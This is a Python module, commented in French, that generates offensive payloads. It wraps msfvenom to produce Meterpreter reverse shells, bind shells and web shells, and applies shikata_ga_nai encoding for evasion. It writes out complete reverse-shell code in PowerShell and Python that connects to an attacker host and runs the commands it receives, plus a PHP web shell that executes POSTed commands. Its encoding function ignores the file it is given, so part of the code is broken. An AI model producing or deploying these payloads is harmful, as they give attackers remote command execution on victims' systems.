#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
💣 PAYLOAD GENERATOR - Module de génération de payloads avancés
MSFvenom + Custom Payloads + Encoders
"""

import os
import subprocess
import json
import base64
import random
import string
from datetime import datetime

class PayloadGenerator:
    def __init__(self):
        self.generated_payloads = []
        self.payload_templates = {
            'reverse_shell': {
                'windows': 'windows/meterpreter/reverse_tcp',
                'linux': 'linux/x86/meterpreter/reverse_tcp',
                'android': 'android/meterpreter/reverse_tcp'
            },
            'bind_shell': {
                'windows': 'windows/meterpreter/bind_tcp',
                'linux': 'linux/x86/shell_bind_tcp'
            },
            'web_shell': {
                'php': 'php/meterpreter/reverse_tcp',
                'asp': 'windows/meterpreter/reverse_tcp',
                'jsp': 'java/meterpreter/reverse_tcp'
            }
        }
        
    def generate_reverse_shell(self, platform, lhost, lport, output_file=None):
        """Génère un reverse shell"""
        print(f"💣 Génération reverse shell {platform}")
        
        try:
            if platform not in self.payload_templates['reverse_shell']:
                print(f"❌ Plateforme non supportée: {platform}")
                return None
                
            payload = self.payload_templates['reverse_shell'][platform]
            
            if not output_file:
                output_file = f"payloads/reverse_{platform}_{lport}.exe"
                
            os.makedirs('payloads', exist_ok=True)
            
            # Commande msfvenom
            cmd = [
                'msfvenom',
                '-p', payload,
                f'LHOST={lhost}',
                f'LPORT={lport}',
                '-f', 'exe',
                '-o', output_file
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                payload_info = {
                    'type': 'reverse_shell',
                    'platform': platform,
                    'lhost': lhost,
                    'lport': lport,
                    'file': output_file,
                    'timestamp': datetime.now().isoformat()
                }
                
                self.generated_payloads.append(payload_info)
                print(f"✅ Payload généré: {output_file}")
                return output_file
            else:
                print(f"❌ Erreur génération: {result.stderr}")
                return None
                
        except Exception as e:
            print(f"❌ Erreur payload: {e}")
            return None
            
    def generate_bind_shell(self, platform, lport, output_file=None):
        """Génère un bind shell"""
        print(f"💣 Génération bind shell {platform}")
        
        try:
            if platform not in self.payload_templates['bind_shell']:
                print(f"❌ Plateforme non supportée: {platform}")
                return None
                
            payload = self.payload_templates['bind_shell'][platform]
            
            if not output_file:
                output_file = f"payloads/bind_{platform}_{lport}.exe"
                
            os.makedirs('payloads', exist_ok=True)
            
            # Commande msfvenom
            cmd = [
                'msfvenom',
                '-p', payload,
                f'LPORT={lport}',
                '-f', 'exe',
                '-o', output_file
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                payload_info = {
                    'type': 'bind_shell',
                    'platform': platform,
                    'lport': lport,
                    'file': output_file,
                    'timestamp': datetime.now().isoformat()
                }
                
                self.generated_payloads.append(payload_info)
                print(f"✅ Payload généré: {output_file}")
                return output_file
            else:
                print(f"❌ Erreur génération: {result.stderr}")
                return None
                
        except Exception as e:
            print(f"❌ Erreur payload: {e}")
            return None
            
    def generate_web_shell(self, language, lhost, lport, output_file=None):
        """Génère un web shell"""
        print(f"💣 Génération web shell {language}")
        
        try:
            if language not in self.payload_templates['web_shell']:
                print(f"❌ Langage non supporté: {language}")
                return None
                
            payload = self.payload_templates['web_shell'][language]
            
            if not output_file:
                output_file = f"payloads/webshell_{language}_{lport}.{language}"
                
            os.makedirs('payloads', exist_ok=True)
            
            # Commande msfvenom
            cmd = [
                'msfvenom',
                '-p', payload,
                f'LHOST={lhost}',
                f'LPORT={lport}',
                '-f', 'raw',
                '-o', output_file
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                payload_info = {
                    'type': 'web_shell',
                    'language': language,
                    'lhost': lhost,
                    'lport': lport,
                    'file': output_file,
                    'timestamp': datetime.now().isoformat()
                }
                
                self.generated_payloads.append(payload_info)
                print(f"✅ Web shell généré: {output_file}")
                return output_file
            else:
                print(f"❌ Erreur génération: {result.stderr}")
                return None
                
        except Exception as e:
            print(f"❌ Erreur web shell: {e}")
            return None
            
    def generate_custom_payload(self, payload_type, custom_options):
        """Génère un payload personnalisé"""
        print(f"💣 Génération payload personnalisé: {payload_type}")
        
        try:
            output_file = f"payloads/custom_{payload_type}_{random.randint(1000, 9999)}.exe"
            os.makedirs('payloads', exist_ok=True)
            
            # Construire la commande msfvenom
            cmd = ['msfvenom', '-p', payload_type]
            
            for option, value in custom_options.items():
                cmd.extend([f'{option}={value}'])
                
            cmd.extend(['-f', 'exe', '-o', output_file])
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                payload_info = {
                    'type': 'custom',
                    'payload_type': payload_type,
                    'options': custom_options,
                    'file': output_file,
                    'timestamp': datetime.now().isoformat()
                }
                
                self.generated_payloads.append(payload_info)
                print(f"✅ Payload personnalisé généré: {output_file}")
                return output_file
            else:
                print(f"❌ Erreur génération: {result.stderr}")
                return None
                
        except Exception as e:
            print(f"❌ Erreur payload personnalisé: {e}")
            return None
            
    def encode_payload(self, input_file, encoder='shikata_ga_nai', iterations=1):
        """Encode un payload existant"""
        print(f"🔒 Encodage payload: {input_file}")
        
        try:
            output_file = f"{input_file}_encoded.exe"
            
            cmd = [
                'msfvenom',
                '-p', 'generic/shell_reverse_tcp',
                'LHOST=127.0.0.1',
                'LPORT=4444',
                '-e', encoder,
                f'-i', str(iterations),
                '-f', 'exe',
                '-o', output_file
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"✅ Payload encodé: {output_file}")
                return output_file
            else:
                print(f"❌ Erreur encodage: {result.stderr}")
                return None
                
        except Exception as e:
            print(f"❌ Erreur encodage: {e}")
            return None
            
    def generate_powershell_payload(self, lhost, lport, output_file=None):
        """Génère un payload PowerShell"""
        print(f"💣 Génération PowerShell payload")
        
        try:
            if not output_file:
                output_file = f"payloads/powershell_{lport}.ps1"
                
            os.makedirs('payloads', exist_ok=True)
            
            # Payload PowerShell personnalisé
            powershell_payload = f"""
$client = New-Object System.Net.Sockets.TCPClient("{lhost}", {lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
"""
            
            with open(output_file, 'w') as f:
                f.write(powershell_payload)
                
            payload_info = {
                'type': 'powershell',
                'lhost': lhost,
                'lport': lport,
                'file': output_file,
                'timestamp': datetime.now().isoformat()
            }
            
            self.generated_payloads.append(payload_info)
            print(f"✅ PowerShell payload généré: {output_file}")
            return output_file
            
        except Exception as e:
            print(f"❌ Erreur PowerShell: {e}")
            return None
            
    def generate_python_payload(self, lhost, lport, output_file=None):
        """Génère un payload Python"""
        print(f"💣 Génération Python payload")
        
        try:
            if not output_file:
                output_file = f"payloads/python_{lport}.py"
                
            os.makedirs('payloads', exist_ok=True)
            
            # Payload Python personnalisé
            python_payload = f"""
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{lhost}", {lport}))

while True:
    command = s.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())

s.close()
"""
            
            with open(output_file, 'w') as f:
                f.write(python_payload)
                
            payload_info = {
                'type': 'python',
                'lhost': lhost,
                'lport': lport,
                'file': output_file,
                'timestamp': datetime.now().isoformat()
            }
            
            self.generated_payloads.append(payload_info)
            print(f"✅ Python payload généré: {output_file}")
            return output_file
            
        except Exception as e:
            print(f"❌ Erreur Python: {e}")
            return None
            
    def generate_php_webshell(self, output_file=None):
        """Génère un web shell PHP"""
        print(f"💣 Génération PHP web shell")
        
        try:
            if not output_file:
                output_file = f"payloads/webshell.php"
                
            os.makedirs('payloads', exist_ok=True)
            
            # Web shell PHP
            php_webshell = """<?php
if(isset($_POST['cmd'])) {
    $output = shell_exec($_POST['cmd']);
    echo "<pre>$output</pre>";
}
?>
<form method="post">
<input type="text" name="cmd" placeholder="Command">
<input type="submit" value="Execute">
</form>"""
            
            with open(output_file, 'w') as f:
                f.write(php_webshell)
                
            payload_info = {
                'type': 'php_webshell',
                'file': output_file,
                'timestamp': datetime.now().isoformat()
            }
            
            self.generated_payloads.append(payload_info)
            print(f"✅ PHP web shell généré: {output_file}")
            return output_file
            
        except Exception as e:
            print(f"❌ Erreur PHP web shell: {e}")
            return None
            
    def get_generated_payloads(self):
        """Retourne les payloads générés"""
        return self.generated_payloads
        
    def export_payloads(self, filename):
        """Exporte les informations des payloads"""
        with open(filename, 'w') as f:
            json.dump(self.generated_payloads, f, indent=2)
            
        print(f"📤 Payloads exportés: {filename}")
        
    def list_available_payloads(self):
        """Liste les payloads disponibles"""
        try:
            result = subprocess.run(['msfvenom', '--list', 'payloads'], 
                                  capture_output=True, text=True)
            
            if result.returncode == 0:
                return result.stdout
            else:
                return "❌ Erreur lors de la récupération des payloads"
                
        except Exception as e:
            return f"❌ Erreur: {e}" 